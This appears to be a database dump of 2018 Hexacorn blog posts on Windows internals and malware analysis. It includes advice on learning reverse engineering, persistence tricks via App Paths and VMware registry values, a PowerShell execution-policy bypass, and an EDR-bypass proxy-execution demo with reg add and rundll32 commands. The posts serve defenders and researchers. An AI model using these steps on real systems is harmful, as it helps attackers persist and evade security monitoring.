videos, because watching videos is very passive; if it helps you to start tho – use it – by all means… whatever makes you start; here are recommended videos:\n\nhttps://www.youtube.com/channel/UC–DwaiMV-jtO-6EvmKOnqg, Thx Karsten Hahn (@struppigel)\nhttps://tuts4you.com/e107_plugins/download/download.php?order=name&sort=DESC&view=30&from=30&error=0&action=list&id=17, and https://www.youtube.com/watch?v=rC_TvFcumBo, Thx @hasherezade\n\n\n\n\nI will repeat it ad nauseam. Don’t rely on tools from the day one. It will cost you long-term. Use pen. Write stuff down. Make mistakes. Correct them. Nowadays I often use an editor, but that’s because we have virtual machines and you can make mistakes inside the VMs that won’t crash the host system; in the past, when a mistake meant a system crash or hang, I had a lot of paper around me with notes, and lots of hexadecimal stuff written on it\nIf you have done the manual analysis at least once, you will be:\n\nable to understand what you see or look it up\nable to spot tricks (in a file format, in a code)\nable to write tools\nYAY! if you can write tools you will be always ahead of the curve… the best example is given here by @hasherezade – she is producing lots of Proof Of Concept code and she often writes it for TESTING purposes (to see if she understands the technique properly and to test other tools)\n\n\n\nRule #6:\n\nThe best reversers are not necessarily malware reversers\nThe best reversers often started by poking around in other people’s software\nIn the past they didn’t have tools that are available today; they spent hours, days, weeks, months staring at some code, trying to break it\nSome of them (e.g. Rolf Rolles) can do what some refer to as ‘Zen reversing’ – they look at the code, and can instantly recognize what it does; I actually have a ‘personal’ list of people that I almost religiously respect for the reversing magic they can do (e.g. vulnerability researchers, but also coders and reversers who often understand advanced math and apply it to build better tools)\nLike anything in the world, it requires lots of hours spent on training; it’s gonna hurt\n\nAnd on a practical note…\nReverse Code Engineering (RCE) is getting really popular and is really needed. It is helpful in malware analysis, debugging your own apps, solving crackmes, fixing bugs in abandowanware, and it can be handy in localization. It makes you a better programmer as well. Of course, it also helps to steal and plagiarize code, bypass software protections, discover vulnerabilities, write shellcodes and jailbreaks, reproduce stuxnets, rootkits and make people’s lives miserable and/or interesting in many other creative ways. All of it is either coding, or reading other peoples’ code, and repurposing it. Again, you better be a programmer to do reversing efficiently. The code blocks in malware are the exact code block used in a legitimate software. The old posts on e.g. CodeGuru and CodeProject are often leveraged in malware creations. Often, pretty much in a copypasta way. These posts are often very detailed. Read stuff that is still there. StackOverflow can wait.\nSo, back to the original question: how to learn RCE and/or malware analysis quickly?\nThere are many answers online and they vary a lot. Many people suggest books, tutorials, ebooks… on IDA, on assembly, on Reverse Engineering in general, some suggest doing courses and certificates (including GREM), others watching youtube videos and some advise new adepts of RCE to simply stop wasting their time.\nI would like to provide you with my own version making it as minimalistic and practical at the same time as possible. Yes, it is not full, yes it is far from being perfect, yes you are not going to analyze rootkits just yet (and yes – it is Windows oriented).\nBut…\nIf you read the stuff I point to and really focus on spending a few hours/week on actually making tones of mistakes plus avoid claiming victories easily achieved by using automation and tools developed by others, you are going to get there before you even realize:\n\nDecide if it is for you; seriously… reversing is a terribly mundane process… it’s actually like forensics, and probably no one will tell you how boring it can be, but it’s HOURS and DAYS spent on staring at the same screen, browsing items and trying to understand it… sometimes you hit a jackpot and crack it in 5mins, sometimes even 2 weeks of intensive reversing won’t bring ANYTHING useful… so… you have been warned\nYou need to learn about programming in general and actually start coding. I repeat: you can’t reverse engineer if you don’t program. How can you understand what you see if you don’t know what a loop is, a recursion, or statically or dynamically linked code is. It is simple as that. If you programmed before, move on to the next point. If you didn’t – don’t buy heavy C++, C#, Java, Python reference books just yet. Buy a book with silly, but practical examples of simple programs explaining the fundamental architecture of Windows. Try this classic book from Charles Petzold. Read it inside out, and take your time to actually _type_ the code listings. Yes, you heard that right. It’s mundane, it’s error-prone, yet this is how learning to program works. The only way is through a keyboard so, get ready to invest quite a lot of time – you will be fixing typos, compiler errors, getting completely unpredictable results and will encounter a lot of pain and stress as you go along.\nIn any case, DO NOT START WITH JAVA OR .NET. Sweat a bit with C, even scripts in VBS, bash, and powershell.\nRead other peoples’ code. Skim through it, and if you find something interesting, read more thoroughly and ‘get it’. Again, no need to understand everything, but if you want to understand, google around until you do. No, do not start reading Linux code just yet. Start with short code snippets on educational web sites. Look at the source code of some small, but interesting and potentially malware-related projects. Just see how people do stuff, try to figure it out. This is actually the most crucial part of reverse engineering – it is not only about reading the code, browsing through listings, spotting known APIs, running ‘strings’ on a file, or playing around with ‘Procmon’, ‘Dependency Walker’ and ‘GMER’. It is trying to wear authors’ shoes for a moment. If you can figure out his or her thought process that led to this and that implementation, you will be making a huge progress very quickly. Bonus: when you notice some code blocks, they will stick to you, so next time you see similar code, you can make an educated guess. Didn’t I tell you it’s all about an educated guess? Yes… ROI is important. You don’t want to disassemble the whole 1.5Mb binary.\nLearn a small subset of x86 assembly language.\n\nNo, no, no… Intel manuals are not a good start. Very confusing. Try Win32ASM tutorials from Iczelion first. Pick up his examples one by one and read it thoroughly. Pay attention to syntax, conventions, comments, names, etc.; the code you see there is what you will most likely encounter while doing your first reversing exercises. There is no expectations you will understand everything in one go. Get used to syntax, code, format, overall ‘feel’ of what you see. This will come superhandy when you look at code shown by IDA or other disassemblers\nThese tutorials are very good for anyone who wants to learn the assembly language and already knows something about programming:\n\nhttps://medium.com/bugbountywriteup/bolo-reverse-engineering-part-1-basic-programming-concepts-f88b233c63b7\nhttps://medium.com/@danielabloom/bolo-reverse-engineering-part-2-advanced-programming-concepts-b4e292b2f3e\n\n\n\n\nChoose easy targets first. Look at compiled sources from Iczelion projects, compare them to the source code, look at programs for Windows XP (things are not complicated on this system as they are on Vista/W7+), look at old software; nowadays, the programming is pretty complicated from a reverse engineering perspective (lots of RAD tools that use lots of wrappers that hide the actual program’s code and analysing it manually is a pain in the butt)\nRefer to MSDN often. Anytime you come across a new function name, either google or MSDN it. make sure you read the concepts associated with the function (usually functions are associated with some ‘high level’ topic e.g. CreateFile with File Management). Seriously. Read the full description, don’t be lazy and it’s okay if you don’t ‘get’ everything in one go. Bits you pick up as you read stuff will provide you with an invaluable insight in the future.\nOnly now start googling for tutorials on how to reverse/crack/debug applications or buy books that will expand your knowledge. Yes, reversing requires a solid foundation from many aspects of IT; if you don’t know these basics, you will continue to be a tool user and no youtube video or book on IDA can help you here…\nAnd the good news… read about forensics. When I started it was almost a non-existing branch of IT (Sec); now it provides a crazy amount of information with regards to artifacts and what is ‘good to know’ about the systems you look at. It classifies and solidifies knowledge about what is that malware does and what parts of the system it affects. Instead of knowing everything, you can focus on areas that are the most exposed, malware-wise. The Art of Memory forensics is gold. Read it.\nThe Art of Memory forensics will bring you closer to the OS internals; The OS internals and the system architecture is a must-understand bit when you do malware analysis; you need to learn about objects, files, Registry, but also mutexes, semaphores, memory layout, a difference between process, threads, fibers, process environment, process environment block, structured and vectored exceptions, and so on and so forth… Read Widows internals book\nWhen you get a bit more experienced, read through corkami repo…. Ange is one of the best reversers I know personally and he is the magician beyond many tricks affecting a huge number of file formats; apart from Rolf Rolles he is one of my ‘zen reversers’ that I follow pretty much religiously\nSo.. yeah… join social media, groups and just start following reversers… there are lots of very good reversers on Twitter – find them!\nGet used to the fact you will be re-learning reverse engineering often. Your tricks, and your tools expire. New file formats, modification to existing file formats, new programming frameworks, new obfuscators, new tools, it’s new stuff all the time (okay, maybe with the exception of macros in Office \n\nSo… How to become the best Malware Analyst E-V-E-R?\nYou can’t cheat here. You need to do hours. Many hours.\nbtw if you are interested in SOC basics you may also try How to become the best SOC Analyst E-V-E-R\nShare this :)', 'How to...', 'http://www.hexacorn.com/blog/2018/04/14/how-to-become-the-best-malware-analyst-e-v-e-r/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (28, 'Permanent Link to Let’s stare at the Screensaver again, shall we?', 'Hexacorn', 'April 7, 2018 ', 'You know you can change your screensaver, right?\nYou know the screensaver used to be configured inside the system.ini file, the [boot] section, the SCRNSAVE.EXE setting, right?\nYou know the configuration is now stored under HKCU\\Control Panel\\Desktop\\Scrnsave.exe, right?\nSo…\nExplain this:\nvs.\nWhen the system detects 1 minute of non-activity, it launches the… 3d Text Screen Saver:\n\nHow come then it shows the Bubbles as a Screen Saver of choice ?\nWhen I discovered it, I thought I will be posting yet another part in the Beyond Good Ol’ Run key series; unfortunately, despite various efforts didn’t succeed to force the system to launch the .exe (or .scr really) of my choice when the screensaver kicks off (and with – as I hypothesized – an added bonus of hiding from Autoruns, which didn’t work either :().\nWhy then posting it?\nWell… it’s good to poke around and explain the unexplained.\nThe reason for the Bubbles showing up, despite the 3d Text Screen Saver being the actual, “real” screensaver is *cough* simple *cough*.\nTurns out there is an undocumented setting in Registry that is being used by the control panel applet responsible for Screensaver setup.\nThe location and the example setting in my case is as follows:\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ScreenSavers\r\nSCRNSAVE.EXE=c:\\test\\Bubbles.scr\r\n\nIt fools the applet which reads the data from this registry and assumes this is an active ScreenSaver, but this value doesn’t seem to be taken into account when the actual screensaver is launched, so we have two settings – one bogus (perhaps a feature that was not fully implemented?), and the real one, that can be at least partially masked by the bogus one (unless you use Autoruns).\nInterestingly, changing the screensaver via the Screen Saver Settings panel will result in the actual screensaver being changed, yet the setting seen during the next visit to the panel will remain as set inside the HKLM\\…\\ScreenSavers key. A side effect of the precedence in which the applet reads the settings (HKLM key first, then the HKCU) vs. the settings that it actually uses to launch the screensaver of choice (based on the HKCU\\Control Panel\\Desktop\\Scrnsave.exe settings and ignoring the HKLM key).\nShare this :)', 'Trivia', 'http://www.hexacorn.com/blog/2018/04/07/lets-stare-at-the-screensaver-again-shall-we/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (29, 'Permanent Link to A quick note about PSExecutionPolicyPreference', 'Hexacorn', 'April 6, 2018 ', 'Running powershell scripts on the system is typically restricted so the usual way to bypass it is to:\n\nrun powershell -ep <policy> and its variants\nuse Set-ExecutionPolicy <policy> after launching powershell.exe\n\nThere is also one more option – use an environment variable called PSExecutionPolicyPreference.\nSee screenshot:\n\nShare this :)', 'Trivia', 'http://www.hexacorn.com/blog/2018/04/06/a-quick-note-about-psexecutionpolicypreference/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (30, 'Permanent Link to LoadPackagedLibrary – I don’t even know why should we mention it', 'Hexacorn', 'April 5, 2018 ', 'This is yet another API that can be used to load libraries.\nWhat was the need for it?\nHard to say.\nAs far as I can tell only one module on Windows 10 imports it today.\nUnder the hood, it’s just a wrapper for a LoadLibraryExW which in turn relies on LdrLoadDll. Still, if you code sandboxes you may want to capture it.\nShare this :)', 'Trivia', 'http://www.hexacorn.com/blog/2018/04/05/loadpackagedlibrary-i-dont-even-know-why-should-we-mention-it/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (31, 'Permanent Link to Enlightened and Unenlightened PE files', 'Hexacorn', 'April 2, 2018 ', 'If you thought that the world of the PE files cannot get even more confusing I have some news for you: some of the PE files can be enlightened.\nI came across enlightened files by looking at the Windows 10 files – what caught my attention was this resource inside the Notepad on Windows 10:\nI have never seen it before so quick google search followed. Despite the fact this particular resource type/name is not a topic that was much discussed on the internet I quickly discovered this presentation from 2016.\nOn a slide 37 it states:\nDeclare your app enlightened (Win32)\nAdd these entries to resources.rc\nMICROSOFTEDPENLIGHTENEDAPPINFO EDPENLIGHTENEDAPPINFOID\nBEGIN\n0x0001\nEND\nMICROSOFTEDPPERMISSIVEAPPINFO EDPPERMISSIVEAPPINFOID\nBEGIN\n0x0001\nEND\nA-ha!\nOkay.\nBut what does it do/mean?\nTurns out this is a part of Windows  Information Protection (WIP) initiative that focuses on supporting application management within Enterprise and covers both Mobile and Desktop devices. It enforces certain privacy rules on applications including data access and transfer between managed and unmanaged apps. The Enterprise enlightened apps are these that follow strict policies and protect data by design. They are able to distinguish between the personal and company data and protect (or not) it accordingly. From what I understood so far, in the proposed model the data is tagged and its use is guarded by policies associated with tags. This is actually pretty cool. Apps can then get a native support from OS that will enforce certain rules e.g. can block screen capture, clipboard and any other form of data exchange.\nThere is more information here. The article actually puts Notepad on the List of enlightened Microsoft apps.\nSo, if you see these resources it simply means that the program was designed with WIP in mind. I am still wondering how this can be verified (since anyone can add these resources during the compilation time, right?). Also, from what I have read about WIP – ‘Unenlightened apps, when marked as corporate-managed, consider all data corporate and encrypt everything by default.’. This is pretty interesting if the encryption is ‘by default’. I wonder how will it affect malware behavior and artifacts (not perfectly clear how the encryption is applied an on what level; will e.g. keylog files written by an unenlightened app /e.g. malicious code injected into Notepad?/ be somehow encrypted? will registry data be encrypted?).\nIf anyone experimented with this, and/r researched it more in-depth I’d appreciate a follow-up.\nShare this :)', 'File Formats ZOO', 'http://www.hexacorn.com/blog/2018/04/02/enlightened-and-unenlightened-pe-files/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (32, 'Permanent Link to Regedit.exe and a possible race condition', 'Hexacorn', 'April 1, 2018 ', 'Regedit.exe accepts two less known command line arguments:\n\nregserver\nunregserver\n\nWhen launched with any of these it will call the advpack.dll!RegInstallW function passing to it one of the section names (called RegExe or UnregExe respectively) that are defined inside the .inf file embedded directly in the regedit.exe file:\n\nThe extracted .inf file is first saved into a temporary file with a name %Temp%\\RGI<random>.tmp file.\nIt is then interpreted like any standard .inf file.\nOne can use these commands to do at least two things:\n\nunregister regedit file association – see the pasted info below; other than damage, it may render some system repair more difficult (.reg files can’t be used)\nattempt to exploit a race condition and swap the temporary .inf file with one of attackers’, forcing regedit.exe to run the .inf file of attackers’ choice; it’s a tricky one to pull of, but the possibility exists\n\nThe Regshot diff from running the regedit /unregserver command on a test Windows 7 system is shown below:\n----------------------------------\r\nKeys deleted:17\r\n----------------------------------\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\.reg\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\.reg\\PersistentHandler\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regedit\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regedit\\shell\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regedit\\shell\\open\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regedit\\shell\\open\\command\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\DefaultIcon\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\shell\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\shell\\edit\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\shell\\edit\\command\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\shell\\open\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\shell\\open\\command\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\shell\\print\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\shell\\print\\command\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\ShellEx\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\ShellEx\\{8895b1c6-b41f-4c1c-a562-0d564250836f}\r\n\r\n----------------------------------\r\nValues deleted:14\r\n----------------------------------\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\.reg\\PersistentHandler\\: \"{5e941d80-bf96-11cd-b579-08002b30bfeb}\"\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\.reg\\: \"regfile\"\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regedit\\shell\\open\\command\\: \"regedit.exe %1\"\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regedit\\: \"Registration Entries\"\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\shell\\edit\\command\\: *%SystemRoot%&#x5C;system32&#x5C;notepad.exe \"%1\"*\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\shell\\open\\command\\: \"regedit.exe \"%1\"\"\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\shell\\print\\command\\: *%SystemRoot%&#x5C;system32&#x5C;notepad.exe /p \"%1\"*\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\shell\\open\\: \"Mer&#x26;ge\"\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\shell\\open\\MUIVerb: \"@regedit.exe,-310\"\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\ShellEx\\{8895b1c6-b41f-4c1c-a562-0d564250836f}\\: \"{1531d583-8375-4d3f-b5fb-d23bbd169f22}\"\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\DefaultIcon\\: \"regedit.exe,1\"\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\EditFlags: 0x00100000\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\: \"Registration Entries\"\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\regfile\\FriendlyTypeName: \"@regedit.exe,-309\"\r\n\r\n\r\n\nShare this :)', 'Anti-*, Random ideas', 'http://www.hexacorn.com/blog/2018/04/01/regedit-exe-and-a-possible-race-condition/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (33, 'Permanent Link to Curious case of the conhost.exe and condrv.sys', 'Hexacorn', 'April 1, 2018 ', 'Update\nAfter I posted the question to Twitter, Alex Ionescu (god of NT kernel internals, for those who don’t know) suggested that it could be an export by ordinal from the ntoskrnl.exe. It was not the case in this scenario, but it’s a very good direction for investigation and I didn’t think of it when I encountered the issue.\n\nFollowing on that lead I dug deeper. Further inspection of the condrv.sys driver confirmed that at least 2 functions from ntoskrnl.exe are imported by the ordinal (0x0001, and 0x0002):\n->Import Table\r\n 1. ImageImportDescriptor:\r\n OriginalFirstThunk: 0x0000A1AC\r\n TimeDateStamp: 0x00000000 (GMT: Thu Jan 01 00:00:00 1970)\r\n ForwarderChain: 0x00000000\r\n Name: 0x0000AA04 (\"ntoskrnl.exe\")\r\n FirstThunk: 0x00002088\r\n\r\nOrdinal/Hint API name\r\n ------------ ---------------------------------------\r\n 0x00FF \"ExReleasePushLockExclusiveEx\"\r\n\r\n\r\n 0x0002  <------- import by ordinal\r\n 0x05C1 \"ObCloseHandle\"\r\n 0x067F \"PsGetProcessImageFileName\"\r\n 0x0001  <------- import by ordinal\nso Alex’s explanation points us in a right direction, except the issue is the import table of condrv.sys, not the export table of ntoskrnl.exe; IDA somehow assumes the names of the ‘guessed’ service functions based on the ordinals and does it wrongly – this is what causes confusion and ends up with us staring at an incorrect disassembly.\nOld Post\nA few months back I came up with an idea to find out how the conhost.exe process is spawn by the OS to co-exist with pretty much every single console applications on the system.\nI theorized that if I find out how it is spawn, I may be able to possibly influence this process and make it behave differently from the expected (wishful thinking that perhaps I could find a way to run this process anytime I want and hijack it for e.g. process hollowing or sth along these lines).\nAfter looking at the code of the AllocConsole function (which is a prime suspect here as it allocates consoles after all), I eventually landed in the code that calls NtDeviceIoControlFile with the IOCTL 0x500037.\nQuick google search followed and I re-visited an excellent posts from FireEye:\n\nhttps://www.fireeye.com/blog/threat-research/2017/08/monitoring-windows-console-activity-part-one.html\nhttps://www.fireeye.com/blog/threat-research/2017/08/monitoring-windows-console-activity-part-two.html\n\nwhere the very same conhost.exe spawning mechanism is also described, although briefly.\nSo, there is a way to launch a conhost.exe process bypassing all the WinExec/ShellExecute/ShellExecuteEx/CreateProcess/CreateProcessInternal/etc. API layer. Still, there is no easy way to obtain the handle to that process so the malware that would try to use it would still need to find that process and hijack it. It looks like OS designers took the malicious bit into account and made it a bit harder for the coders to abuse it.\nThe reason for this post is not the mechanism itself, but the curious issue I encountered while analysing the condrv.sys driver. It is the driver that actually receives the IOCTL 0x500037 and processes it, calling the ZwCreateUserProcess routine in the end, at least, this is my working hypothesis at the moment.\nWhy hypothesis?\nWhen you analyze the the driver w/o symbols, the system routine the driver calls to launch conhost.exe is not ZwCreateUserProcess, but ExAcquireRundownProtection. A very strange choice. It is only applying the .pdb file to IDA will allow to map that call to ZwCreateUserProcess. Could it be an intentional way to obfuscate the calls? Or, am I missing something? I will admit my kernel mode analysis skills are really rusty.\nIdeas, anyone?\nThis is what I see inside the condrv.sys without symbols (see that 2nd functions):\n\nand with symbols:\n\nShare this :)', 'Puzzles, Reversing', 'http://www.hexacorn.com/blog/2018/04/01/curious-case-of-the-conhost-exe-and-condrv-sys/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (34, 'Permanent Link to The little known (I think) secret of hosts.ics', 'Hexacorn', 'March 31, 2018 ', 'Today I discovered that while everyone knows one can use the c:\\WINDOWS\\system32\\drivers\\etc\\hosts file to introduce static entries to the DNS resolver there is one more file that can be utilized for this purpose.\nIt is a hosts.ics (c:\\WINDOWS\\system32\\drivers\\etc\\hosts.ics) file that was originally designed to support the Internet Connection Sharing service. It looks like it is being ingested by the DNS resolver same way as the hosts file.\nSo… yet another place to look at.\nAfter introducing the file on my system to a test Win 10 box I got the following results:\n\nShare this :)', 'Anti-Forensics, Compromise Detection', 'http://www.hexacorn.com/blog/2018/03/31/the-little-known-i-think-secret-of-hosts-ics/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (35, 'Permanent Link to Beyond good ol’ Run key, Part 75', 'Hexacorn', 'March 28, 2018 ', 'This is a little, naughty trick that enables us to achieve persistence in a quite an unexpected way.\nWhen we talk about PATH environment variable, we know that we can set it to a specific variable using the Registry keys:\n\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\nHKCU\\Environment\n\nThe problem with these is that they affect either the whole system, or the specific user. The are also widely known and any attempts of modification will be easily visible.\nThere is one more.\nI actually described it in this series and referred to it twice; the key in question is located here:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\n\n(Note that there is no WOW64 equivalent.)\nIn the first instance, I was talking about changing the (Default) value for applications to point to a malware, and mentioned the Path value will contain the string that will prepend the PATH for the application.\nIn the second instance I pretty much described an example of what this post discusses in more detail.\nWhatever is included inside the Path variable will be added to the PATH of the program; whether it is prepended or appended is dictated by a presence of an undocumented value AppendPath. If AppendPath exists the content of Path will be appended to the PATH; if it is missing, the value of PATH will be prepended (and this is a default behavior).\nAs I mentioned one can change the path for pretty much any application (and create new entries for e.g. randomized file entries). While dvdplay.exe discussed earlier is a bad example, because it’s not really used that frequently, one could toy around with more popular apps.\nFor instances, adding:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\\nApp Paths\\cmd.exe\\Path=c:\\test\n\nwill ensure that whatever program is executed from the terminal will be searched for within the current directory, then c:\\test, and then directories listed inside the PATH. Have a look at what happens when you run Notepad from terminal in such scenario:\n\nIt’s a perfect condition for a more elaborate PATH companion malware.\nThe same goes for powershell.exe, cscript.exe, etc.\nAnd there is more.\nAny application that uses LoadLibrary will follow the DLL Search Order and as such, may end up loading the DLL from the c:\\test directory.  Let’s think of the last scenario for a moment – we could place an EXE in one place, and then drop the DLL in another. The only link for finding the DLL would be in that Registry Key.\nThe below example illustrates it perfectly.\nWe add:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\\ntest.exe\\Path=c:\\test\n\nWe then place c:\\test\\foobar.dll and then run the c:\\somefolder\\test.exe – the test.exe uses LoadLibrary to load ‘foobar’ DLL and exits (the DLL is loaded w/o providing a path forcing the program to walk through the DLL Search order).\nWithout looking into the App Paths registry branch, or preserving the environment variables at the time the test.exe program ran, it is going to be impossible to link these two binaries in any way. Collection of samples or ‘combos of samples that work together’ will be also harder.\nAnd yes, you could modify rundll32.exe to point its extra path item to some hidden folder too \nShare this :)', 'Anti-*, Autostart (Persistence)', 'http://www.hexacorn.com/blog/2018/03/28/beyond-good-ol-run-key-part-75/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (36, 'Permanent Link to Beyond good ol’ Run key, Part 74', 'Hexacorn', 'March 26, 2018 ', 'This is a very obscure persistence mechanism that affects VMWare Tools versions that utilize the vm3dum DLL (‘VMware SVGA 3D Usermode’):\n\nc:\\Program Files\\Common Files\\VMware\\Drivers\\video_wddm\\vm3dum.dll\n\nWhen loaded (which happens e.g. when Internet Explorer is launched) the DLL checks the content of the following registry key:\n\nHKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools\\Usermode\\\nAdapterShimPath=<path>\n\nand loads library that the path points to.\nThere is also one more key:\n\nHKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools\\Usermode\\\nShimPath=<path>\n\nbut the condition for loading this DLL is not entirely clear to me.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Riddles, Incident Response', 'http://www.hexacorn.com/blog/2018/03/26/beyond-good-ol-run-key-part-74/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (37, 'Permanent Link to DeXRAY 2.10 update', 'Hexacorn', 'March 26, 2018 ', 'Brian and I worked together again on fixing some bugs in the way DeXRAY handles the VBN files. The result is a quick update which you can download here.\nThx Brian!\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBaidu (QV)\nBitDefender (BDQ)\nBullGuard (Q)\nCMC Antivirus (CMC)\nComodo <GUID> (not really; Quarantined files are not encrypted \nESafe (VIR)\nESET (NQF)\nF-Prot (TMP) (Magic@0=’KSS’)\nKaspersky (KLQ, System Watcher’s <md5>.bin)\nLavasoft AdAware (BDQ) /BitDefender files really/\nLumension LEMSS (lqf)\nMalwareBytes Data files (DATA) – 2 versions\nMalwareBytes Quarantine files (QUAR) – 2 versions\nMcAfee Quarantine files (BUP) /full support for OLE format/\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – D3 45 C5 99 header handled\nPanda <GUID> Zip files\nSpybot – Search & Destroy 2 ‘recovery’\nSUPERAntiSpyware (SDB)\nSymantec ccSubSdk files: {GUID} files and submissions.idx\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN)\nSymantec Quarantine Index files (QBI)\nSymantec Quarantine files on MAC (quarantine.qtn)\nTrendMicro (Magic@0=A9 AC BD A7 which is a ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nZemana <hash> files+quarantine.db\nAny binary file (using X-RAY scanning)\n\nShare this :)', 'Batch Analysis, DeXRAY, Software Releases', 'http://www.hexacorn.com/blog/2018/03/26/dexray-2-10-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (38, 'Permanent Link to Running programs via Proxy & jumping on a EDR-bypass trampoline, Part 6', 'Hexacorn', 'March 25, 2018 ', 'In my recent post I documented how you can drop your own wmplayer.exe and force it to be loaded via dvdplay.exe. Here, I will show one of many DLLs that we can force to execute a specifically-named executable – mstran40.exe.\nThe msrepl40.dll’s internal name is ‘Microsoft Replication Library’ – as far as I can guess it is used by the Microsoft database engine – well, at least it exports a number of database-related functions so it must be somehow related. It doesn’t matter too much.\nWe are going to use one of the exported functions (#2091) that is kind enough to run any executable that is named mstran40.exe – provided a specific registry key is set. The internal name of the aforementioned function #2091 is JetTrClientInit. The mstran40.exe doesn’t exist on Windows 7 and XP, so while attempting to execute it system will search the PATH directories and since it won’t find it it will run it from a current directory. The trick doesn’t work on Win 10 :(.\nThe Registry key in question is this:\n\nHKLM\\SOFTWARE\\Microsoft\\Jet\\4.0\\Transporter\\TransporterId=GUID\n\nwhere GUID can be simply this:\n\n{00000000-0000-0000-0000-000000000000}\n\nIt is required so that the function IIDFromString can succeed in converting it into a proper GUID. We are just providing the conditions for the JetTrClientInit function not to exit prematurely.\nSee attached animation to see how it works in practice:\n\nHere’s a list of commands:\nreg add HKLM\\SOFTWARE\\Microsoft\\Jet\\4.0\\Transporter /v TransporterId /t REG_SZ /d {00000000-0000-0000-0000-000000000000}\r\n\r\nmd en-US\r\ncopy c:\\WINDOWS\\system32\\en-US\\calc.exe.mui c:\\test\\en-US\\mstran40.exe.mui\r\ncopy c:\\windows\\system32\\calc.exe c:\\test\\mstran40.exe\r\n\r\nrundll32.exe msrepl40.dll,#2091\r\n\nAnd if you are wondering why am I copying the En-us directory and the MUI file; this is to ensure calc.exe (renamed to mstran40.exe) finds its resources which are stored in a separate file (if I chose a different .exe e.g. any console-based program this wouldn’t be necessary, but we all want to see that Calculator, don’t we…).\nShare this :)', 'Anti-*, Living off the land, LOLBins', 'http://www.hexacorn.com/blog/2018/03/25/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-6/\n');
